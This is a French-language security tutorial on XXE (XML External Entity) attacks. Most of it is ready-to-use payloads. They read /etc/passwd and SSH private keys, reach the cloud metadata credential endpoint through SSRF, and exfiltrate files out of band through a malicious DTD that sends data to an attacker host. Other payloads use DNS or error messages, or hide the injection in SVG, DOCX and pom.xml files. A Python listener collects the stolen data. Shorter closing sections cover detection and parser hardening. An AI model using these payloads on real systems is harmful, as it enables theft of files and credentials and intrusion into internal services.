---
title: XXE en profondeur
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [xxe, xml, ssrf, lfi, blind-xxe, oob, sécurité, web]
date: 2026-03-22
---

# XXE en profondeur

XXE (XML External Entity) exploite le traitement des entités externes XML pour lire des fichiers locaux, effectuer des SSRF, ou exfiltrer des données.

## Rappel XML

```xml
<!-- Entité interne -->
<!DOCTYPE foo [ <!ENTITY name "valeur"> ]>
<root>&name;</root>  <!-- → "valeur" -->

<!-- Entité externe — lit un fichier ou une URL -->
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]>
<root>&ext;</root>   <!-- → contenu de /etc/passwd -->

<!-- Entité de paramètre (utilisée dans les DTD) -->
<!DOCTYPE foo [ <!ENTITY % param "valeur"> ]>
```

## XXE classique — lecture de fichiers

```xml
<!-- Lire /etc/passwd -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

<!-- Lire un fichier Windows -->
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>

<!-- Lire une clé SSH -->
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///home/alice/.ssh/id_rsa">
]>

<!-- Via le protocole PHP (si le backend est PHP) -->
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<!-- → Contenu en base64, contourne les caractères spéciaux qui casseraient le XML -->
```

## XXE via SSRF

```xml
<!-- Accéder à un service interne -->
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>

<!-- Scanner un port interne -->
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
```

## Blind XXE — aucun retour dans la réponse

### OOB (Out-of-Band) via DTD externe

Quand le serveur traite le XXE mais n'affiche pas la valeur, on utilise une DTD externe hébergée sur notre serveur.

```bash
# 1. Héberger une DTD malveillante sur notre serveur
# http://attaquant.com/evil.dtd
```

```xml
<!-- evil.dtd — DTD externe hébergée par l'attaquant -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attaquant.com/?data=%file;'>">
%exfil;
%send;
```

```xml
<!-- Payload envoyé à la cible -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://attaquant.com/evil.dtd">
  %xxe;
]>
<root><data>irrelevant</data></root>
```

```bash
# 2. Serveur attaquant reçoit la requête
# GET /?data=root:x:0:0:root:/root:/bin/bash... HTTP/1.1

# Serveur Python simple pour la réception
python3 -m http.server 80
# Ou avec logging complet :
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print('[RECU]', self.path)
        self.send_response(200)
        self.end_headers()
HTTPServer(('0.0.0.0', 80), H).serve_forever()
"
```

### Blind XXE via Burp Collaborator

```xml
<!-- Test de connectivité OOB (confirme le XXE) -->
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://xyz.oastify.com/xxe-test">
  %xxe;
]>

<!-- Exfiltration via DNS (contourne les firewalls HTTP) -->
<!-- evil.dtd adapté pour DNS -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % oob "<!ENTITY &#x25; dns SYSTEM 'http://%file;.attaquant.com/'>">
%oob;
%dns;
```

### Error-based Blind XXE

Quand les erreurs XML sont affichées dans la réponse :

```xml
<!-- DTD hébergée — déclenche une erreur contenant le fichier -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY &#x25; oops SYSTEM 'file:///FICHIER_INEXISTANT/%file;'>">
%error;
%oops;
<!-- → Erreur : "FICHIER_INEXISTANT/root:x:0:0:..." → fuite dans le message d'erreur -->
```

## XXE via formats alternatifs

XXE n'est pas limité aux requêtes XML directes. Tout format parsé en XML peut être vulnérable.

```bash
# DOCX / XLSX / PPTX (archives ZIP contenant du XML)
# Extraire et modifier word/document.xml
unzip document.docx -d doc_extracted/
# Modifier doc_extracted/word/document.xml pour injecter un XXE
# Recompresser
cd doc_extracted && zip -r ../evil.docx .

# SVG (si le serveur convertit des SVG)
# evil.svg
```

```xml
<!-- evil.svg — XXE dans un SVG uploadé -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

```python
# PDF via FOP (Apache Formatting Objects Processor)
# Si un endpoint génère des PDF depuis du XML
# XSL-FO vulnérable à XXE

# RSS/Atom (parseurs XML côté serveur)
# SAML (assertions XML)
# SOAP (enveloppes XML)
```

## XXE dans les fichiers de configuration

```xml
<!-- Maven pom.xml — si parsé par un CI/CD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE project [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<project>
  <description>&xxe;</description>
</project>
```

## Chaining XXE → RCE

```xml
<!-- Si PHP avec expect:// activé (rare mais existant) -->
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://id">
]>

<!-- Via Groovy/Java XXE → SSRF → service interne vulnérable -->
<!-- Ex: XXE → http://localhost:8080/jenkins/script → RCE Jenkins -->
```

## Détection

```bash
# Burp Suite — scanner XXE
# Intercepter une requête XML → clic droit → Scan → Active Scan

# Test manuel — injecter dans tous les paramètres XML
# Tester aussi les endpoints qui acceptent du JSON :
# Changer Content-Type: application/json → application/xml
# et convertir le body en XML

# Paramètres à tester
# - Champs de fichier uploadé (SVG, DOCX, PDF)
# - APIs SOAP
# - Requêtes qui retournent du XML
# - Headers comme Content-Type, Accept
```

## Contre-mesures

```python
# Python — désactiver les entités externes
from lxml import etree

# Dangereux
tree = etree.parse(xml_input)

# Sûr
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(xml_input, parser)

# Java — désactiver les entités
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

# PHP
libxml_disable_entity_loader(true);  # PHP < 8.0
# PHP 8.0+ : désactivé par défaut
```

```
Checklist XXE :
✓ Désactiver le chargement des DTD externes
✓ Désactiver les entités externes (general + parameter)
✓ Utiliser des parseurs XML sûrs par défaut (JAXB avec restrictions)
✓ Valider et sanitiser les fichiers uploadés (SVG, DOCX, RSS...)
✓ Pas de résolution réseau depuis le parseur XML (no_network=True)
✓ Mettre à jour les bibliothèques XML régulièrement
```
